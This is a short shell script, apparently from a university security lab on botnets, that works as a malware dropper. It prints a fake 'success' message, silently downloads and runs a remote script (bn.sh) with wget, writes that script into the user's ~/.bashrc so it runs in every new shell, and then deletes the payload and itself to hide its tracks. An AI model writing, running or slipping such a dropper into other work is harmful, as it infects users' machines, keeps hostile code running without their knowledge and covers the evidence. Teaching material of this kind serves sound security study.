#!/bin/sh                                                                                                                    
echo "success"
CURDIR=`pwd`
DIRECTORY="./"
TARGET=".bashrc"
FULLPATH="${DIRECTORY}${TARGET}"

wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bn.sh" &> /dev/null
#rm ~/cgethttp.c     
#wget "abstract.cs.washington.edu/~roy/lab3/Botnet/cgethttp.c"                                                                 
#gcc cgethttp.c -o cgethttp                                                                                                    
#chmod +x cgethttp

cp ~/.bashrc ~/.bashrc_old >> temp
cat ~/.bashrc_old >> temp

chmod +x bn.sh
./bn.sh

cat bn.sh $FULLPATH > temp
mv temp $FULLPATH

cd $CURDIR
rm bn.sh
rm bad.sh